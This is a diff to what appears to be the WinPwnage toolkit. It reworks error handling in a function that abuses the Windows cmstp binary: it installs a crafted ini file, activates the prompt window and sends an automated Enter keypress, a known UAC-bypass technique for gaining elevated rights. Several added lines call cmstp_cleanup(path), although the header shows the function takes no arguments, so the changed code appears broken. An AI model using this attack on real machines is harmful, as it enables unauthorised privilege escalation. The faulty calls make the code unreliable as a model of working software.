@@ -27,7 +27,8 @@ def cmstp_cleanup():
 		print_error("Unable to clean up, manual cleaning is needed")
 		return False
 	else:
-		print_success("Successfully cleaned up")	
+		print_success("Successfully cleaned up")
+		print_success("All done!")
 
 def cmstp(payload):
 	if payloads().exe(payload):
@@ -76,8 +77,10 @@ ShortSvcName="WinPwnageVPN"
 			print_success("Successfully triggered installation of ini file using cmstp binary")
 		else:
 			print_error("Unable to trigger installation of ini file using cmstp binary")
-			if "error" in Constant.output:
-				cmstp_cleanup()
+			for x in Constant.output:
+				if "error" in x:
+					cmstp_cleanup(path)
+					return False
 
 		time.sleep(1)
 
@@ -86,8 +89,10 @@ ShortSvcName="WinPwnageVPN"
 			print_success("Successfully detected process window - hwnd ({hwnd})".format(hwnd=hwnd))
 		else:
 			print_error("Unable to detect process window, cannot proceed")
-			if "error" in Constant.output:
-				cmstp_cleanup()
+			for x in Constant.output:
+				if "error" in x:
+					cmstp_cleanup(path)
+					return False
 
 		time.sleep(1)	
 
@@ -95,22 +100,23 @@ ShortSvcName="WinPwnageVPN"
 			print_success("Activated window using SetForegroundWindow - hwnd ({hwnd})".format(hwnd=hwnd))			
 		else:
 			print_error("Unable to activate window using SetForegroundWindow - hwnd ({hwnd})".format(hwnd=hwnd))
-			if "error" in Constant.output:
-				cmstp_cleanup()			
+			for x in Constant.output:
+				if "error" in x:
+					cmstp_cleanup(path)
+					return False		
 
 		time.sleep(1)	
 
 		if ctypes.windll.user32.keybd_event(0x0D,0,0,0):
-			print_success("Successfully sent keyboard-event to window - hwnd ({hwnd})".format(hwnd=hwnd))	
+			print_success("Successfully sent keyboard-event to window - hwnd ({hwnd})".format(hwnd=hwnd))
+			time.sleep(5)
+			cmstp_cleanup()
 		else:
 			print_error("Unable to send keyboard-event to window - hwnd ({hwnd})".format(hwnd=hwnd))
-			if "error" in Constant.output:
-				cmstp_cleanup()
-
-		time.sleep(3)
-
-		if not cmstp_cleanup():
-			print_success("All done!")
+			for x in Constant.output:
+				if "error" in x:
+					cmstp_cleanup(path)
+					return False
 	else:
 		print_error("Cannot proceed, invalid payload")
 		return False			
